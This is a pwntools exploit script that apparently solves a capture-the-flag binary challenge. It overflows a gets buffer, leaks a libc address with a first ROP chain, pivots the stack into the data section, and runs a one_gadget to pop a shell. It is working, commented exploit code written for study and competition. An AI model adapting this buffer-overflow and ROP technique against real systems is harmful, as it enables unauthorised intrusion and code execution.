# cp ./chall ./chall_patched
# patchelf ./chall_patched --set-interpreter ./path/to/ld/file

from pwn import *

context.clear(arch='amd64', terminal=['tmux', 'splitw', '-fh'], aslr=True)

elf = ELF('./chall_patched')
libc = ELF('./libc.so.6')

gdbscript = '''b *main+440
b *main+163
b *main+138
b exit
c
c
c
c
c
c

'''

# minecraft gadgets
nop_ret = p64(0x4010ef)
pop_rbp_ret = p64(0x40115d)
main = p64(elf.sym['main'])
read_int = p64(elf.sym['read_int'])
data_section = p64(0x404100 + 0x38)     # add 0x38 bc we will overwrite rbp later wil a writable section for one gadget

p = process('./chall_patched', env={"LD_PRELOAD" : "./libc.so.6"})
#p = gdb.debug('./chall_patched', env={"LD_PRELOAD" : "./libc.so.6"}, gdbscript=gdbscript)
#p = remote('chall.lac.tf', 31137)

payload  = b'A' * 64            # fill buffer
payload += p64(1)               # sets stack pointer to rbp to a garbage value

# 1st ropchain
payload += nop_ret              # nop ; ret to 16 byte align stack
payload += read_int             # sets rax to our input (0x404020 for exit got addr) for overwrite
payload += pop_rbp_ret          # pop rbp ; ret
payload += data_section         # push a data_section on the stack so pop rbp gadget sets rbp = exit@got to be able to write second ropchain there
payload += p64(0x401243)        # ret to puts before the gets call to print a libc leak
payload += main                 # return to main for second ropchain
payload += b'C' * 8     # for debugging

p.sendline(b'1')                        # singleplayer
p.sendline(payload)                     # this is the 1st gets call, sets ropchain
p.sendline(b'1')                        # survival
p.sendline(b'2')                        # exit = 2, restart = 1

p.clean()
p.sendline(b'4210688')  # setting rax to puts@got from read_int in ropchain to puts libc leak

p.recvuntil(b'\x80')
puts_got = int.from_bytes(b'\x80' + p.recv(5), 'little')
libc.address = puts_got - libc.sym['puts']

print('[+] libc base @  ', hex(libc.address))

# libc ropgadgets
pop_rdi = p64(libc.address + 0x277e5)
pop_r13 = p64(libc.address + 0x29830)
one_gadget = p64(libc.address + 0xd511f)

# 2nd ropchain
payload2  = b'A' * 0x40         # 0x4040f8 - 0x404130 are set to 'A's, started writing at 0x4040f8 bc the gets call writes to rbp-0x40. rbp is 0x404038 so minus 0x40 = 0x4040f8
payload2 += p64(0x404200)       # 0x404138 sets rbp to 0x404200 needed for one_gadget since rbp-0x38 needs to be a writable section
payload2 += pop_rdi
payload2 += p64(0x0)    # set rdi = NULL
payload2 += pop_r13
payload2 += p64(0x0)    # set r13 = NULL
payload2 += one_gadget  # pop shell

p.sendline(payload2)    # overwrite exit@got to be "pop rdi ; ret" gadget so that we enter main again in ropchain correctly

p.sendline(b'1')        # survivial to call exit to return back to main
p.sendline(b'2')        # get to main epilogue to call leave to pivot stack to data_section 0x404140

sleep(5)        # get rid of the program output for cleaner output
p.clean()

print('[+] Popped shell')

p.interactive()
